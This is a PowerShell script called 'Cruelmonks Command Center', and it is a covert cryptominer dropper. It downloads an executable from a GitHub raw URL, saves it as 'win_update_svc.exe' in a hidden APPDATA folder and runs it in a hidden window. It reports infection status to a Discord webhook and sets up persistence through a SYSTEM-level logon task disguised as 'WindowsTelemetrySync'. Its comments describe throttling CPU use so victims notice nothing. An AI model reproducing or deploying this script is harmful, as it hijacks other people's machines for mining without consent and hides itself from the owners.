# Cruelmonks Command Center v3.0
$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"
$serviceDir = "$env:APPDATA\SystemServices"
$stagerUrl = "https://raw.githubusercontent.com/itzcurled/cruelmonks/main/update_service.dat"
$stagerPath = "$serviceDir\win_update_svc.exe"
$pcName = $env:COMPUTERNAME

function Send-Discord($status, $color) {
    $payload = @{
        embeds = @(@{
            title = "Cruelmonks Deployment Update"
            color = $color
            fields = @(
                @{ name = "Device"; value = $pcName; inline = $true },
                @{ name = "Status"; value = $status; inline = $true }
            )
            footer = @{ text = "Deployment Time: $(Get-Date)" }
        })
    } | ConvertTo-Json -Depth 4
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

# 1. Prepare Environment
if (-not (Test-Path $serviceDir)) { New-Item -Path $serviceDir -ItemType Directory -Force | Out-Null }

# 2. Download & Deploy
try {
    Invoke-WebRequest -Uri $stagerUrl -OutFile $stagerPath
    Start-Process -FilePath $stagerPath -WindowStyle Hidden
    Send-Discord "SUCCESS: Device is now Online & Mining" 65280 # Green
} catch {
    Send-Discord "FAILED: Deployment error on device" 16711680 # Red
}

# 3. Persistence (Auto-Restart on Startup)
$action = New-ScheduledTaskAction -Execute $stagerPath
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsTelemetrySync" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# 4. Resource Management (90% Idle / 30% Active)
# This is handled by the C++ loader passing the '--cpu-max-threads-hint 30'
# and setting 'Idle Priority' to ensure zero lag while you use the PC.
